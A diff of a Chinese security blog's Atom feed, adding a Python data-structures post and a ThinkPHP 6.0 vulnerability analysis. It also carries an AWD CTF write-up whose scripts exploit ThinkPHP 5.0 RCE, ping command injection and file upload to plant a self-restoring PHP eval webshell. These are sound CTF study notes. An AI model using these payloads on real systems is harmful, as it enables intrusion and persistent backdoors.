@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://prontosil.com/"/>
-  <updated>2020-03-14T13:30:36.037Z</updated>
+  <updated>2020-03-17T14:12:07.061Z</updated>
   <id>http://prontosil.com/</id>
   
   <author>
@@ -17,11 +17,67 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>python数据结构</title>
+    <link href="http://prontosil.com/posts/7f8e2ad4/"/>
+    <id>http://prontosil.com/posts/7f8e2ad4/</id>
+    <published>2020-03-17T13:29:33.000Z</published>
+    <updated>2020-03-17T14:12:07.061Z</updated>
+    
+    <content type="html"><![CDATA[<p>补充一个小知识</p><p>python 输入重定向为文件</p><pre><code>import syssys.stdin = open(&quot;test.txt&quot;)</code></pre><p>之后就可以直接从文件读入，不需要手动输入了</p><h2 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h2><pre><code>实现链表输入1 3 5 4 1 9 4 将其存储为链表格式</code></pre><p>链表数据结构：</p><pre><code class="python">class ListNode:    def __init__(self, x=-1):        self.val = x        self.next = None</code></pre><h3 id="创建链表，返回头节点-尾插法"><a href="#创建链表，返回头节点-尾插法" class="headerlink" title="创建链表，返回头节点 (尾插法)"></a>创建链表，返回头节点 (尾插法)</h3><pre><code class="python">def creat_list(line:list) -&gt; ListNode:    root = ListNode()    tail = root    for i in line:        temp = ListNode(i)        tail.next = temp        tail = tail.next      return root.next</code></pre><h3 id="遍历链表"><a href="#遍历链表" class="headerlink" title="遍历链表"></a>遍历链表</h3><pre><code class="python">def traverse_list(root:ListNode):    &#39;&#39;&#39;    遍历链表，没有头节点    &#39;&#39;&#39;    temp = root    while temp:        print(temp.val+&quot; &quot;,end=&quot;&quot;)        temp = temp.next    print()</code></pre><h3 id="删除倒数第n个节点，一次遍历"><a href="#删除倒数第n个节点，一次遍历" class="headerlink" title="删除倒数第n个节点，一次遍历"></a>删除倒数第n个节点，一次遍历</h3><p>用两个指针指向，第一个指针先走 <code>n+1</code> 步，中间空出n个节点，然后删除即可</p><pre><code class="python">def removeNthFromEnd(head:ListNode, n:int)-&gt;ListNode:    &#39;&#39;&#39;    一次遍历算法    &#39;&#39;&#39;    new_head = ListNode(-1)    new_head.next = head    first = new_head    second = new_head    for i in range(n+1):        first = first.next        while first != None:        first = first.next        second = second.next    second.next = second.next.next    return new_head.next</code></pre><h3 id="向右旋转链表"><a href="#向右旋转链表" class="headerlink" title="向右旋转链表"></a>向右旋转链表</h3><p>就是把单链表组成一个循环链表</p><pre><code class="python">def rotateRight(head:ListNode, k:int)-&gt;ListNode:    &#39;&#39;&#39;    针对链表进行旋转    &#39;&#39;&#39;    if k == 0:        return head    if head == None:        return head    temp = head    length = 0    while temp.next != None:        length += 1        temp = temp.next    length += 1    temp.next = head    temp = head    for i in range((length - k%length -1)):        temp = temp.next    new_head = temp.next    temp.next = None    return new_head</code></pre><h2 id="图"><a href="#图" class="headerlink" title="图"></a>图</h2><h3 id="创建图"><a href="#创建图" class="headerlink" title="创建图"></a>创建图</h3><p>采用邻接表进行存储， <code>ArcNode</code> 代表邻接点， <code>VNode</code> 代表边节点</p><pre><code class="python">class ArcNode:    def __init__(self,adjvex, weight):        self.adjvex = adjvex        self.weight = weight        self.next = Noneclass VNode:    def __init__(self):        self.next = None</code></pre><p>输入数据</p><pre><code>输入格式：4 40 1 1 01 0 1 01 1 0 11 1 1 1</code></pre><p>读入数据，创建邻接矩阵</p><pre><code class="python">def create_table()-&gt;list:    m,n = [int(i) for i in input().split()] # 自动解包    A = [0 for i in range(m)]    for i in range(m):        A[i] = [int(j) for j in input().split()]    return A</code></pre><p>邻接矩阵转换为邻接表</p><pre><code class="python">def create_Adj(A)-&gt;list:    &#39;&#39;&#39;    邻接矩阵转换为邻接表    &#39;&#39;&#39;    G = [VNode() for i in range(len(A))]    for i,vex in enumerate(A):        # 第i个节点，及其所有的边        for node,j in enumerate(vex):            if j != 0:                p = ArcNode(node, j)                p.next = G[i].next                G[i].next = p    return G</code></pre><p>打印邻接表</p><pre><code class="python">def disp_adj(G):    for index,i in enumerate(G):        p = i.next        print(index, end=&quot;&quot;)        while p != None:            print(&quot; {}-&gt;&quot;.format(p.adjvex), end=&quot;&quot;)            p = p.next        print()</code></pre><h3 id="深度优先搜索"><a href="#深度优先搜索" class="headerlink" title="深度优先搜索"></a>深度优先搜索</h3><pre><code class="python">visited = [0 for i in range(4)]def DFS(G, v):    &#39;&#39;&#39;    深度优先搜索    &#39;&#39;&#39;    visited[v] = 1    print(v, end=&quot;&quot;)    p = G[v].next    while p != None:        w = p.adjvex        if visited[w] == 0:            DFS(G,w)        p = p.next    print()</code></pre><h3 id="广度优先搜索"><a href="#广度优先搜索" class="headerlink" title="广度优先搜索"></a>广度优先搜索</h3><pre><code class="python">def BFS(G, v):    &#39;&#39;&#39;    广度优先搜索    &#39;&#39;&#39;    q = Queue()    visited = [0 for i in range(len(G))]    print(v,end=&quot;&quot;)    visited[v] = 1    q.put(v)    while not q.empty():        w = q.get()        p = G[w].next        while p!=None:            if visited[p.adjvex] == 0:                print(p.adjvex, end=&quot;&quot;)                visited[p.adjvex] = 1                q.put(p.adjvex)            p = p.next    print()</code></pre><h3 id="Dijkstar-算法"><a href="#Dijkstar-算法" class="headerlink" title="Dijkstar 算法"></a>Dijkstar 算法</h3><pre><code class="python">def Dijkstra(A, v):    &#39;&#39;&#39;    Dijkstar 算法    &#39;&#39;&#39;    for i in A:        for index,value in enumerate(i):            if value == -1:                i[index] = sys.maxsize    dist = A[v] # 原始v到各个顶点的距离    path = [0 for i in range(len(A))]     for i in range(len(A)):        if A[v][i] != -1:            path[i] = v        else:            path[i] = -1    s = [0 for i in range(len(A))]    s[v] = 1    for i in range(len(A)):        mindis = sys.maxsize        # 寻找最小路径长度顶点u        for j in range(len(A)):            if s[j] == 0  and dist[j] &lt; mindis:                u = j                mindis = dist[j]        s[u] = 1        for j in range(len(A)):            if s[j] == 0:                if A[u][j] &lt; sys.maxsize and dist[j] &gt; 0 and dist[u]+A[u][j] &lt; dist[j]:                    dist[j] = dist[u] + A[u][j]                    path[j] = u    return path, dist</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;补充一个小知识&lt;/p&gt;
+&lt;p&gt;python 输入重定向为文件&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;import sys
+
+sys.stdin = open(&amp;quot;test.txt&amp;quot;)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;之后就可以直接从文件读入，不需要手动输入了&lt;/p&gt;
+      
+    
+    </summary>
+    
+    
+      <category term="编程" scheme="http://prontosil.com/categories/%E7%BC%96%E7%A8%8B/"/>
+    
+    
+      <category term="python" scheme="http://prontosil.com/tags/python/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>thinkphp6.0漏洞分析</title>
+    <link href="http://prontosil.com/posts/314a66d3/"/>
+    <id>http://prontosil.com/posts/314a66d3/</id>
+    <published>2020-03-17T12:33:18.000Z</published>
+    <updated>2020-03-17T13:29:03.137Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="通过session写文件"><a href="#通过session写文件" class="headerlink" title="通过session写文件"></a>通过session写文件</h2><p>漏洞点位于：<code>/think/session/Store.php</code></p><pre><code class="php">    /**     * session_id设置     * @access public     * @param string $id session_id     * @return void     */    public function setId($id = null): void    {        $this-&gt;id = is_string($id) &amp;&amp; strlen($id) === 32 ? $id : md5(microtime(true) . session_create_id());    }</code></pre><p>针对sessionid的校验不严</p><p><img src="/posts/314a66d3/1584448906099.png" alt></p><p>之后初始化session</p><p><img src="/posts/314a66d3/1584448927094.png" alt></p><p>保存session的过程： <code>think/session/Store.php</code></p><pre><code class="php">    /**     * 保存session数据     * @access public     * @return void     */    public function save(): void    {        $this-&gt;clearFlashData();        $sessionId = $this-&gt;getId();        if (!empty($this-&gt;data)) {            $data = $this-&gt;serialize($this-&gt;data);            $this-&gt;handler-&gt;write($sessionId, $data);        } else {            $this-&gt;handler-&gt;delete($sessionId);        }        $this-&gt;init = false;    }</code></pre><p>进入到 <code>write</code> 函数写入</p><p>最后存储到文件中</p><p><img src="/posts/314a66d3/1584449025846.png" alt></p><p>这样，如果我能控制session的数组中的某个值，就能直接写入shell</p><p>成功写入：</p><p><img src="/posts/314a66d3/1584449183704.png" alt></p><h2 id="6-0-POP链分析"><a href="#6-0-POP链分析" class="headerlink" title="6.0 POP链分析"></a>6.0 POP链分析</h2><p>入口</p><p><img src="/posts/314a66d3/1584451502585.png" alt></p><p>进入 <code>save</code> 函数</p><p><img src="/posts/314a66d3/1584451535191.png" alt></p><p>继续步入</p><p><img src="/posts/314a66d3/1584451560678.png" alt></p><p>进入到 <code>cleanContents</code> 函数，直接返回原值(没有过滤因为不是多维数组)</p><pre><code class="php">    public function cleanContents(array $contents)    {        $cachedProperties = array_flip([            &#39;path&#39;, &#39;dirname&#39;, &#39;basename&#39;, &#39;extension&#39;, &#39;filename&#39;,            &#39;size&#39;, &#39;mimetype&#39;, &#39;visibility&#39;, &#39;timestamp&#39;, &#39;type&#39;,        ]);        foreach ($contents as $path =&gt; $object) {            if (is_array($object)) {                $contents[$path] = array_intersect_key($object, $cachedProperties);            }        }        return $contents;    }</code></pre><p>返回</p><p><img src="/posts/314a66d3/1584451622290.png" alt></p><p>跟进 <code>set</code> 函数，这里的 <code>$this-&gt;store</code> 已经被覆盖为 File 类</p><p><img src="/posts/314a66d3/1584451656966.png" alt></p><p><img src="/posts/314a66d3/1584451671730.png" alt></p><p>最后有两个利用方式：</p><ol><li><pre><code class="php"> protected function serialize($data): string {     if (is_numeric($data)) {         return (string) $data;     }     $serialize = $this-&gt;options[&#39;serialize&#39;][0] ?? &quot;\Opis\Closure\serialize&quot;;     return $serialize($data); }</code></pre></li></ol><ol start="2"><li><p>利用伪协议任意文件写入</p></li></ol><p><img src="/posts/314a66d3/1584451721156.png" alt></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;通过session写文件&quot;&gt;&lt;a href=&quot;#通过session写文件&quot; class=&quot;headerlink&quot; title=&quot;通过session写文件&quot;&gt;&lt;/a&gt;通过session写文件&lt;/h2&gt;&lt;p&gt;漏洞点位于：&lt;code&gt;/think/session/Sto
+      
+    
+    </summary>
+    
+    
+      <category term="CTF" scheme="http://prontosil.com/categories/CTF/"/>
+    
+    
+      <category term="thinkphp" scheme="http://prontosil.com/tags/thinkphp/"/>
+    
+  </entry>
+  
+  <entry>
     <title>apache配置文件简单记录</title>
     <link href="http://prontosil.com/posts/a3f2ee6b/"/>
     <id>http://prontosil.com/posts/a3f2ee6b/</id>
     <published>2020-03-14T13:23:42.000Z</published>
-    <updated>2020-03-14T13:30:36.037Z</updated>
+    <updated>2020-03-15T11:42:38.520Z</updated>
     
     <content type="html"><![CDATA[<p>一直不太清楚apache的配置文件，简单记录一下</p><p><code>/etc/apache2</code> 下的文件</p><p><code>apache2.conf</code> 是主配置文件，之后的 <code>available</code> 代表可用的, <code>enable</code> 代表已经启用的</p><p><img src="/posts/a3f2ee6b/1584192313504.png" alt></p><p><code>sites-enabled</code> 下</p><p><img src="/posts/a3f2ee6b/1584192394696.png" alt></p><p>000-default.conf 文件规定了网站根目录</p><pre><code>&lt;VirtualHost *:80&gt;        # The ServerName directive sets the request scheme, hostname and port that        # the server uses to identify itself. This is used when creating        # redirection URLs. In the context of virtual hosts, the ServerName        # specifies what hostname must appear in the request&#39;s Host: header to        # match this virtual host. For the default virtual host (this file) this        # value is not decisive as it is used as a last resort host regardless.        # However, you must set it for any further virtual host explicitly.        #ServerName www.example.com        ServerAdmin webmaster@localhost        DocumentRoot /var/www/html        # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,        # error, crit, alert, emerg.        # It is also possible to configure the loglevel for particular        # modules, e.g.        #LogLevel info ssl:warn        ErrorLog ${APACHE_LOG_DIR}/error.log        CustomLog ${APACHE_LOG_DIR}/access.log combined        # For most configuration files from conf-available/, which are        # enabled or disabled at a global level, it is possible to        # include a line for only one particular virtual host. For example the        # following line enables the CGI configuration for this host only        # after it has been globally disabled with &quot;a2disconf&quot;.        #Include conf-available/serve-cgi-bin.conf&lt;/VirtualHost&gt;# vim: syntax=apache ts=4 sw=4 sts=4 sr noet</code></pre><p><code>/etc/apache2/mods-enabled /mime.conf</code> 中配置了可以解析的文件类型</p><p><img src="/posts/a3f2ee6b/1584192584702.png" alt></p><p>这样就能解析 php5 等的后缀了</p>]]></content>
     
@@ -49,7 +105,7 @@
     <link href="http://prontosil.com/posts/f1d265cd/"/>
     <id>http://prontosil.com/posts/f1d265cd/</id>
     <published>2020-03-14T10:37:47.000Z</published>
-    <updated>2020-03-14T13:15:41.033Z</updated>
+    <updated>2020-03-15T11:42:38.523Z</updated>
     
     <content type="html"><![CDATA[<p>又双叒叕的打了一次AWD比赛，简单地总结一下</p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><h3 id="直接读flag"><a href="#直接读flag" class="headerlink" title="直接读flag"></a>直接读flag</h3><p>最开始放了web2，ssh连上去，d盾没扫出什么东西</p><p>然后开始一个个看(现在都流行不放shell，直接给flag的2333)</p><p><img src="/posts/f1d265cd/1584182423201.png" alt></p><p>丢给群里的其他师傅开始写批量</p><pre><code class="python">import requestsimport report = [20180,20280,20380,20480,20580,20680,20780,20880,20980,21080,21180,21280,21380,21480,21580,21680,21780,21880,21980,22080,22180,22280,22380,22480]url = &#39;http://ip:{port}/login.php&#39;for i in port:    r = requests.get(url=url.format(port=str(i)))    if r.status_code == 200:        try:            print(re.findall(r&quot;(flag{.*})&quot;,r.text)[0])        except IndexError:            pass</code></pre><p>批量交flag(后来发现平台有设置csrf token。导致无法批量交。)</p><pre><code class="python">send_url = &#39;http://ip:8001/api/v1/challenges/attempt&#39;cookie = {&#39;Cookie&#39;: &#39;session=be71fde5-8749-46b2-8ac6-fb30b0ec93bb; PHPSESSID=pdq189at1p9g6478tmt8urkng2&#39;}for flag in submit_flag:    data = {&quot;challenge_id&quot;:2,&quot;submission&quot;:flag}    requests.post(url=send_url,data=data,cookies=cookie)</code></pre><p>最后合并为十分钟交一次</p><pre><code class="python">import requestsimport refrom time import sleepwhile True:    port = [20180,20280,20380,20480,20580,20680,20780,20880,20980,21080,21180,21280,21380,21480,21580,21680,21780,21880,21980,22080,22180,22280,22380,22480]    url = &#39;http://ip:{port}/login.php&#39;    submit_flag = []    for i in port:        r = requests.get(url=url.format(port=str(i)))        if r.status_code == 200:            try:                submit_flag.append(re.findall(r&quot;(flag{.*})&quot;,r.text)[0])            except IndexError:                pass    send_url = &#39;http://ip:8001/api/v1/challenges/attempt&#39;    cookie = {&#39;Cookie&#39;: &#39;session=be71fde5-8749-46b2-8ac6-fb30b0ec93bb; PHPSESSID=pdq189at1p9g6478tmt8urkng2&#39;}    for flag in submit_flag:        data = {&quot;challenge_id&quot;:2,&quot;submission&quot;:flag}        req = requests.post(url=send_url,data=data,cookies=cookie)        if &#39;incorrect&#39; not in req.text:            print(&#39;提交正确&#39;)    sleep(600)</code></pre><p>ps.赛后师傅说并没有换cookie，用下面的代码就能批量交。</p><p><img src="/posts/f1d265cd/1584186516112.png" alt></p><h3 id="后台任意文件上传"><a href="#后台任意文件上传" class="headerlink" title="后台任意文件上传"></a>后台任意文件上传</h3><p>看到 <code>test.sql</code> 中是有用户名和密码的，登录之后有上传点</p><p>黑名单只有这几个。。而且htaccess还写错了，php5,php7,phtml也都没有过滤，不过上传之后还是会重命名，算是也过滤了 <code>.htaccess</code> </p><pre><code>$black_list = [&quot;ini&quot;,&quot;htacces&quot;,&quot;php&quot;,&quot;ph3&quot;,&quot;html&quot;];$ext=pathinfo($name)[&#39;extension&#39;];$ext =strtolower($ext);</code></pre><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><h3 id="md文件解析漏洞"><a href="#md文件解析漏洞" class="headerlink" title="md文件解析漏洞"></a>md文件解析漏洞</h3><p>这个web套路好深2333</p><p>d盾可以扫到一个shell，但是是在markdown文件中，还有一个是库中的回调函数</p><p><img src="/posts/f1d265cd/1584182744449.png" alt></p><p>最开始以为是d盾误报，结果后来看了一眼 <code>.htaccess</code></p><pre><code>AddType application/x-httpd-php .html .md</code></pre><p>居然将markdown文件解析为php….这个思路挺强的</p><p>但是由于发现的比较晚，貌似都修好了</p><h3 id="ping命令执行"><a href="#ping命令执行" class="headerlink" title="ping命令执行"></a>ping命令执行</h3><pre><code class="php">function waf($str){    $str=str_replace(&#39; &#39;,&#39;&#39;,$str);    $str=str_replace(&#39;;&#39;,&#39;&#39;,$str);    $str=str_replace(&#39;|&#39;,&#39;&#39;,$str);    return $str;}function ping($host){    $host=waf($host);    var_dump($host);    system(&quot;ping -c 1 $host&quot;);}if(isset($_REQUEST[1]))    ping($_REQUEST[1]);</code></pre><p>这个命令执行倒是挺简单的， <code>&amp;cat&lt;/flag</code> 即可</p><pre><code class="python">import requestsimport report = [30180,30280,30680,30780,30980,31180,31280,31380,31480,31580,31780,31880,31980,32080,32180,32280,32380,32480,31080,30580,30380,30480,30880,31680]url = &#39;http://ip:{port}/common/function.php?1=&amp;cat&lt;/flag&#39;for i in port:    r = requests.get(url=url.format(port=str(i)))    try:        print(re.findall(r&quot;(flag{.*})&quot;,r.text)[0])    except IndexError:        pass</code></pre><h3 id="后台文件上传"><a href="#后台文件上传" class="headerlink" title="后台文件上传"></a>后台文件上传</h3><p>审计源码发现 <code>admin, admin</code>  即可登陆</p><p>然后有文件上传点，直接传shell.md即可解析</p><p>事后写了一个批量上传不死马的脚本</p><pre><code class="python">import requestsimport hashlibbs_webshell = &quot;&quot;&quot;&lt;?php    ignore_user_abort(true);    set_time_limit(0);    unlink(__FILE__);    $file = &#39;%s&#39;;    $code = &#39;&lt;?php if($_POST[&quot;pass&quot;]==&quot;%s&quot;){@eval($_POST[1]);}?&gt;&#39;;    while (1) {        file_put_contents($file, $code);        system(&#39;touch -m -d &quot;2018-12-01 09:10:12&quot; %s&#39;);        usleep(50);    }?&gt;&quot;&quot;&quot;secret = &quot;pxy&quot;shell_path = &quot;.pxy.php&quot;def md5_hash(s):    return hashlib.md5(s.encode()).hexdigest()def generateShell(ip):    pwd = md5_hash(secret + ip)    shell = bs_webshell % (shell_path, pwd, shell_path)    print(shell)    return shelldef checkShell(ip,shell_path):    url = &#39;http://%s/%s&#39; % (ip, shell_path)    try:        res = requests.get(url, timeout=3)    except:        pass    pwd = md5_hash(secret + ip)    res = requests.post(url, data={&#39;pass&#39;: pwd, &#39;1&#39;: &#39;echo(123);&#39;})    print(res.text)    if res.text == &#39;123&#39;:        print(&#39;[+]&#39;+ip,&#39;Check OK&#39;)ports = [30180,30280,30380,30480,30580,30680,30780,30880,30980,31080,31180,31280,31380,31480,31580,31680,31780,31880,31980,33080,32180,32280,32380,32480]ip = &quot;127.0.0.1&quot;for i in ports:    files = {&quot;pic&quot;:(&#39;shell.md&#39;, generateShell(ip), &#39;application/octet-stream&#39;)}    cookies = dict(PHPSESSID=&#39;fjue55il5q0v90fp8l66us6hq0&#39;)    url = &quot;http://&quot;+ip+&quot;:&quot;+str(i)    url_upload = url+&quot;/index.php?c=User&amp;a=upload&quot;    r = requests.post(url=url_upload,files=files, cookies=cookies)    if b&quot;successfully&quot; in r.content:        print(&quot;[+]&quot;+ip+&quot;:&quot;+str(i)+&quot; upload success&quot;)    url_1 = url + &quot;/upload/admin_shell.md&quot;    try:        r = requests.get(url_1,timeout=2)    except requests.exceptions.ReadTimeout:        checkShell(ip, &quot;upload/.pxy.php&quot;)</code></pre><p>后来研究发现，其实文件上传不仅仅是</p><pre><code>/index.php?c=User&amp;a=upload</code></pre><p>也可以</p><pre><code>/index.php?c=File&amp;a=save</code></pre><p>因为 <code>index.php</code> 是这样写的</p><pre><code class="php">$c=isset($_GET[&#39;c&#39;])?$_GET[&#39;c&#39;]:&#39;User&#39;;$a=isset($_GET[&#39;a&#39;])?$_GET[&#39;a&#39;]:&#39;Index&#39;;$obj=run_c($c);run_a($obj,$a);</code></pre><p>URL格式为：</p><pre><code>http://localhost/index.php?c=User&amp;a=home</code></pre><p>就是可以调用任意类的任意方法</p><p>ps比赛的时候我们是这么想的：</p><p>看到 <code>base.php</code> 中实例化了 <code>Smarty</code> </p><p><img src="/posts/f1d265cd/1584186763035.png" alt></p><p>之后看到这里有一处eval。</p><p><img src="/posts/f1d265cd/1584186784920.png" alt></p><p>于是就开始想能不能getshell，但是无果。</p><h3 id="后台getshell"><a href="#后台getshell" class="headerlink" title="后台getshell"></a>后台getshell</h3><p>感谢a2u13师傅</p><p>还是接前面的分析，可以执行任意类的任意方法。但是那个地方是字符串拼接！。</p><p>所以可以直接通过 <code>;</code> 进行命令注入</p><p><img src="/posts/f1d265cd/1584188249191.png" alt></p><p>File类需要登陆才能使用，换一个 <code>User</code>类就行</p><p><img src="/posts/f1d265cd/1584188382658.png" alt></p><p>比赛的时候确实没往这块想，还是要加强代码审计啊</p><h3 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h3><pre><code class="php">&lt;?phpclass home{    public $method;    public $args;    function __construct($method, $args) {        $this-&gt;method = $method;        $this-&gt;args = $args;    }    function __destruct(){        var_dump($this-&gt;method);        ($this-&gt;method)($this-&gt;args);    } }     $a=$_REQUEST[&#39;a&#39;];    @unserialize($a);     ?&gt;</code></pre><p>看上去挺像反序列化的，但是</p><pre><code>($this-&gt;method)($this-&gt;args);</code></pre><p>这里是报错的，所以比赛的时候没法利用</p><p>复盘的时候才意识到原来只有php7才可以这么用</p><p>经过测试发现只能直接动态调用system函数，eval和assert都是不行的</p><p><img src="/posts/f1d265cd/1584191203655.png" alt></p><p><img src="/posts/f1d265cd/1584191226590.png" alt="eval是不行的"></p><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>web1是最后放出来的，为了提高挑战性不给ssh密码。</p><p>但是稍微看两眼就会发现是tp5.0写的，还开了debug，于是直接RCE了</p><pre><code class="python">import requestsimport report = [10180,10280,10380,10480,10580,10680,10780,10880,10980,11080,11180,11280,11380,11480,11580,11680,11780,11880,11980,12080,12180,12280,12380,12480]url_flag = &#39;http://ip:{port}/public/index.php?s=captcha&#39;data = {&#39;_method&#39;:&#39;__construct&#39;,        &#39;filter[]&#39;:&#39;system&#39;,        &#39;method&#39;:&#39;get&#39;,&#39;get[]&#39;:&#39;cat /flag&#39;}for i in port:    r = requests.post(url=url_flag.format(port=str(i)),data=data)    if r.status_code == 200:        try:            print((re.findall(r&quot;(flag{.*})&quot;,r.text)[0]))        except IndexError:            pass</code></pre><p>这一波flag还是挺舒服的，但是遗憾的是没法修啊。。</p><p><img src="/posts/f1d265cd/1584183311879.png" alt></p><p>不过后来意识到可以直接将 <code>/var/www/html</code> 下的文件打包下载，还可以自己往里面写shell然后蚁剑连接进行修改。</p>]]></content>
     
@@ -78,7 +134,7 @@
     <link href="http://prontosil.com/posts/aba5931d/"/>
     <id>http://prontosil.com/posts/aba5931d/</id>
     <published>2020-03-12T14:05:48.000Z</published>
-    <updated>2020-03-12T14:24:02.300Z</updated>
+    <updated>2020-03-15T11:42:38.522Z</updated>
     
     <content type="html"><![CDATA[<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>Hello接口</p><pre><code class="java">import java.rmi.Remote;import java.rmi.RemoteException;public interface Hello extends Remote{    public String hello() throws RemoteException;}</code></pre><p>对应的实现</p><pre><code class="java">import java.io.Serializable;import java.rmi.RemoteException;import java.rmi.server.UnicastRemoteObject;/** * @description: Hello实现 * @author: Pxy * @create: 2020-03-12 22:15 **/public class RemoteHello extends UnicastRemoteObject implements Hello{    protected RemoteHello() throws RemoteException {        super();    }    public String  hello() throws RemoteException {        return &quot;hello&quot;;    }}</code></pre><p>创建一个服务端</p><pre><code class="java">import java.rmi.Naming;import java.rmi.Remote;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.server.UnicastRemoteObject;/** * @description: RMI服务器 * @author: Pxy * @create: 2020-01-20 08:45 **/public class RMIServer {    public void start() throws Exception{        RemoteHello h = new RemoteHello();        LocateRegistry.createRegistry(1099);        Naming.bind(&quot;rmi://127.0.0.1:1099/Hello&quot;, h);    }    public static void main(String[] args) throws Exception {        RMIServer rmiServer = new RMIServer();        rmiServer.start();    }}</code></pre><p>客户端进行访问</p><pre><code class="java">import java.rmi.Naming;/** * @description: RMI客户端 * @author: Pxy * @create: 2020-01-20 08:57 **/public class TrainMain {    public static void main(String[] args) throws Exception {        Hello hello = (Hello) Naming.lookup(&quot;rmi://127.0.0.1/Hello&quot;);        System.out.println(hello.hello());    }}</code></pre><p>这样就能实现RMI</p>]]></content>
     
@@ -435,9 +491,9 @@ codesg se
       <category term="CTF" scheme="http://prontosil.com/categories/CTF/"/>
     
     
-      <category term="pickle" scheme="http://prontosil.com/tags/pickle/"/>
-    
       <category term="反序列化" scheme="http://prontosil.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
+    
+      <category term="pickle" scheme="http://prontosil.com/tags/pickle/"/>
     
   </entry>
   
@@ -479,47 +535,6 @@ codesg se
     </summary>
     
     
-    
-  </entry>
-  
-  <entry>
-    <title>jwt学习笔记</title>
-    <link href="http://prontosil.com/posts/70fc8f0c/"/>
-    <id>http://prontosil.com/posts/70fc8f0c/</id>
-    <published>2020-03-10T05:24:10.000Z</published>
-    <updated>2020-03-10T05:42:37.027Z</updated>
-    
-    <summary type="html">
-    
-    </summary>
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title>requests文档阅读笔记</title>
-    <link href="http://prontosil.com/posts/bce54486/"/>
-    <id>http://prontosil.com/posts/bce54486/</id>
-    <published>2020-03-10T05:20:52.000Z</published>
-    <updated>2020-03-10T06:08:19.061Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="如何发送post请求"><a href="#如何发送post请求" class="headerlink" title="如何发送post请求"></a>如何发送post请求</h2><pre><code> r = requests.post(&#39;http://httpbin.org/post&#39;, data = {&#39;key&#39;:&#39;value&#39;})</code></pre><p>其他的请求也类似</p><pre><code>&gt;&gt;&gt; r = requests.put(&#39;http://httpbin.org/put&#39;, data = {&#39;key&#39;:&#39;value&#39;})&gt;&gt;&gt; r = requests.delete(&#39;http://httpbin.org/delete&#39;)&gt;&gt;&gt; r = requests.head(&#39;http://httpbin.org/get&#39;)&gt;&gt;&gt; r = requests.options(&#39;http://httpbin.org/get&#39;)</code></pre><h2 id="GET请求如何传递URL参数"><a href="#GET请求如何传递URL参数" class="headerlink" title="GET请求如何传递URL参数"></a>GET请求如何传递URL参数</h2><pre><code>In [12]: r = requests.get(url,params={&quot;key1&quot;:&quot;1&quot;, &quot;key2&quot;:&quot;2&quot;})In [13]: r.urlOut[13]: &#39;http://httpbin.org/get?key2=2&amp;key1=1&#39;</code></pre><p>但是怎么传递数组呢？这是个问题</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h2 id=&quot;如何发送post请求&quot;&gt;&lt;a href=&quot;#如何发送post请求&quot; class=&quot;headerlink&quot; title=&quot;如何发送post请求&quot;&gt;&lt;/a&gt;如何发送post请求&lt;/h2&gt;&lt;pre&gt;&lt;code&gt; r = requests.post(&amp;#39;http:/
-      
-    
-    </summary>
-    
-    
-      <category term="编程" scheme="http://prontosil.com/categories/%E7%BC%96%E7%A8%8B/"/>
-    
-    
-      <category term="文档" scheme="http://prontosil.com/tags/%E6%96%87%E6%A1%A3/"/>
     
   </entry>
   
